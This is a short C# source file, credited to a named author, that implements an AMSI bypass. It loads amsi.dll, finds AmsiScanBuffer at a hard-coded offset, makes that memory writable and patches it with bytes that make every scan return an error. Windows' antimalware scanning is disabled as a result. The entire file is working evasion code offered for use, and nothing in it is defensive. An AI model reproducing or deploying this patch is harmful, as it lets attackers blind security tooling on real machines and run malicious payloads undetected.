using System;
using System.Runtime.InteropServices;
// Andres Doreste, ASB Bypass mod without using GetProcAddress

public class Amsi
{
    static byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    public static void Bypass()
    {
        try
        {   
            // Returns amsi.dll address
            var lib = Win32.LoadLibrary("amsi.dll");
            // Locate ASB Function by amsi.dll address + 0x2540 (9536)
            IntPtr ASBPtr = new IntPtr(lib.ToInt64() + 9536);
            // Change memory protection to PAGE_READWRITE
            uint oldProtect;
            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x04, out oldProtect);
            // Apply the patch
            Marshal.Copy(patch, 0, ASBPtr, patch.Length);
            // Change memory protection to PAGE_EXECUTE_READ
            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x20, out oldProtect);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}
class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
